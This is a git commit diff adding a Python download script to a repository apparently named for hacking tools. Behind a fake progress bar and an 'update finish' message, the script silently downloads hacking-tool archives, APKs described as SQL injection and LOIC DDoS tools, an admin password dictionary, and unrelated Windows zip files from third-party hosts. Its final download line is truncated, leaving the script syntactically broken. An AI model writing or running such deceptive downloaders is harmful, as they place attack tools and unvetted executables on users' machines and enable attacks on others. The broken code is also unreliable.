e5a6ccee55dc1f0c2e2289f3c80f22a28106b3ea
hacktoolspack <noenoenoe997@gmail.com>
2017-08-25 00:09:51 +0200

    Add files via upload

---
+++ download.py
@@ -0,0 +1,36 @@
+#!/usr/bin/env python 
+import wget
+import time
+import sys
+
+toolbar_width = 80
+
+# setup toolbar
+sys.stdout.write("[%s]" % (" " * toolbar_width))
+sys.stdout.flush()
+sys.stdout.write("\b" * (toolbar_width+1)) # return to start of line, after '['
+
+for i in xrange(toolbar_width):
+    time.sleep(0.1) # do real work here
+    # update the bar
+    sys.stdout.write("loading...") 
+    sys.stdout.flush()
+
+sys.stdout.write("\n")
+
+print 'wait please'
+wget.download('https://github.com/hacktoolspack/hack-tools/archive/master.zip')
+wget.download('https://github.com/hacktoolspack/sqlmap2/archive/master.zip')
+print '                                                                       '
+print 'update finish'
+print 'thank you for you patience thanks to your patience you benefit from our new application !'
+wget.download('http://download948.mediafire.com/8qu3v7tb1yog/y6yw7ip8s2vq9fi/Web+server+scan+online_1.0.apk')
+wget.download('http://download975.mediafireuserdownload.com/9ays4xxjal4g/we7dn2ehti4d5bw/Sql+injection+online_1.0.apk')
+wget.download('http://download1325.mediafire.com/2o3hthc61oig/3taf865pnw87djj/Loic+ddos+online_1.0.apk')
+wget.download('http://download1590.mediafireuserdownload.com/mzn4itn27rxg/vxom7uy5rleon9h/Dictionnaire+hack+http+https+admin+V.0.3')
+wget.download('https://github.com/hacktoolspack/websites-vulnerables/archive/master.zip')
+wget.download('https://dreamsupport.us/downloads/windows-pc/-ANTIMALWARE/ASKRemover.zip')
+wget.download('https://dreamsupport.us/downloads/windows-pc/Youtube%20Downloader.zip')
+wget.download('
+print '                                                                                 '
+print 'thank you'
